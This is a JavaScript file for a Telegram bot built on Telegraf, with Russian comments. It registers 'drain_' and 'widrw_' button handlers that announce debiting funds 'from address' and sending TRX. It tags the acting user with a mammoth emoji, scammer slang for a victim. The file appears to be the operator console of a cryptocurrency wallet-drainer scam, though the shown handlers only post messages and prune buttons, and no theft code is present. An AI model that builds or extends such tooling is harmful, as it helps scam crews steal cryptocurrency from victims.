import { keyboard } from "telegraf/markup";
import { loggerBot } from "../../lib/logger";
import { bot } from "../bot";

async function keyboardDelete(ctx) {
  try {
    const keyboard =
      ctx.update.callback_query?.message?.reply_markup?.inline_keyboard;

    if (keyboard) {
      // Удаляем только кнопку с callback_data === текущей
      const newKeyboard = keyboard
        .map((row) =>
          row.filter(
            (button) => button.callback_data !== ctx.callbackQuery?.data
          )
        )
        .filter((row) => row.length > 0); // удаляем пустые строки

      // Обновляем клавиатуру
      await ctx.editMessageReplyMarkup({
        inline_keyboard: newKeyboard,
      });
    }
  } catch (err) {
    loggerBot.error(`Ошибка при удалении кноки: ${err}`);
    throw err;
  }
}

bot.action(/^drain_(.+)$/, async (ctx) => {
  const userId = ctx.from?.id;
  const address = ctx.match[1]; // Вытаскиваем адрес из callback_data
  await ctx.answerCbQuery(); // Убираем "часики"
  await ctx.reply(`[${userId}] 🦣 Выполняет cписание с адреса: ${address}...`);
  await keyboardDelete(ctx);
});

bot.action(/^widrw_(.+)_(\d+(?:\.\d+)?)$/, async (ctx) => {
  const userId = ctx.from?.id;
  const address = ctx.match[1];
  const amount = parseFloat(ctx.match[2]);
  const amountParse = Number(amount / 1e6).toFixed(2);
  await ctx.answerCbQuery();
  await ctx.reply(
    `[${userId}] 📤 Отправляет ${amountParse} TRX на адрес ${address}...`
  );
  await keyboardDelete(ctx);
});
